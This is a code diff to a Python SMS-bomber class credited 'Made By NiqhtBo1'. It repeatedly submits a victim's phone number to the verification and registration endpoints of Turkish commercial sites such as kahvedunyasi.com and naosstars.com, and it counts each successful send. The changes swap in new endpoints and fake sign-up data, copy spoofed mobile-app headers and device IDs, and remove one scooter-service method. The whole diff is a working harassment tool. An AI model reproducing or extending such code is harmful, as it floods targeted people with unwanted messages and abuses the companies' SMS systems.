@@ -18,17 +18,17 @@ class SendSms():
     #kahvedunyasi.com
     def KahveDunyasi(self):    
         try:    
-            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
-                "mobile_number": self.phone,
+            kahve_dunyasi = requests.post("https://www.kahvedunyasi.com/kayit-ol", data={
+                "mobilenumber": self.phone,
                 "token_type": "register_token"
             })
             if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
-                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> kahvedunyasi.com")
                 self.adet += 1
             else:
                 raise
         except:    
-            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
+            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> kahvedunyasi.com")
         
      
     #wmf.com.tr
@@ -87,9 +87,9 @@ class SendSms():
     #naosstars.com
     def Naosstars(self):
         try:
-            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
+            url = "https://naosstars.com/user/register"
             headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
-            json={"telephone": f"+90{self.phone}", "type": "register"}
+            json={"telephone": f"+90{self.phone}", "first_name": "memati", "last_name": "baş", "email": self.email, "new_password": "ABC_aBASDC_5423_vAS" , "type": "register"}
             r = requests.post(url, headers=headers, json=json)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
@@ -176,20 +176,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
 
-
-    #heyscooter.com.tr
-    def Hey(self):
-        try:
-            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
-            headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
-            r = requests.post(url, headers=headers)
-            if r.json()["IsSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
 
 
     #bineq.tech
